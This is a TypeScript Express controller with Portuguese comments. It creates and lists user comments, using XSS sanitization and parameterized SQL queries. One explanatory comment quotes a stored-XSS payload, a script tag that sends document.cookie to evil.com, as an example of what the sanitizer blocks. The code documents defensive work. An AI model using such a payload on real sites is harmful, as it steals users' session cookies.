import { Request, Response } from "express";
import db from "../database";

export const criarComentario = async (req: Request, res: Response) => {
    const { texto, usuarioId } = req.body;

    // [SEGURANÇA] ✅ Sanitização de XSS aplicada corretamente.
    // A biblioteca 'xss' remove ou escapa tags HTML e scripts maliciosos
    // do texto antes de qualquer processamento. Isso previne que um atacante
    // salve payloads como <script>...</script> no banco, impedindo XSS Armazenado.
    // Exemplo do que é bloqueado:
    //   texto = "<script>fetch('https://evil.com?c='+document.cookie)</script>"
    //   textoLimpo = "" (script removido pela lib)
    const xss = require('xss');
    const textoLimpo = xss(texto);
    console.log(`Texto limpo: ${textoLimpo}`);

    // [SEGURANÇA] ✅ Query parametrizada corretamente com $1 e $2.
    // O textoLimpo (já sanitizado) e o usuarioId são tratados como DADO
    // pelo banco, não como código SQL, prevenindo SQL Injection.
    const query = `INSERT INTO comentario (texto, usuario_id) VALUES ($1, $2)`;
    try {
        await db.query(query, [textoLimpo, usuarioId]);
        res.status(201).json({ message: "Comentário criado" });
    } catch (err: any) {
        res.status(500).json({ error: err.message });
    }
};

export const listarComentarios = async (_req: Request, res: Response) => {
    try {
        // [SEGURANÇA] ✅ Query sem parâmetros externos, sem risco de SQL Injection.
        // Não há entrada de dados do usuário nessa query.
        //
        // [SEGURANÇA - RISCO RESIDUAL] ⚠️ Os dados retornados aqui alimentam o
        // Dashboard.tsx no front-end. Mesmo com a sanitização feita no criarComentario,
        // o front-end não deve confiar cegamente nos dados do banco — o dangerouslySetInnerHTML
        // que existia no Dashboard.tsx foi removido exatamente por esse motivo.
        // A defesa em camadas (sanitizar no back-end + não usar dangerouslySetInnerHTML
        // no front-end) é a abordagem correta.
        const result = await db.query("SELECT * FROM comentario");
        res.json(result.rows);
    } catch (err: any) {
        res.status(500).json({ error: err.message });
    }
};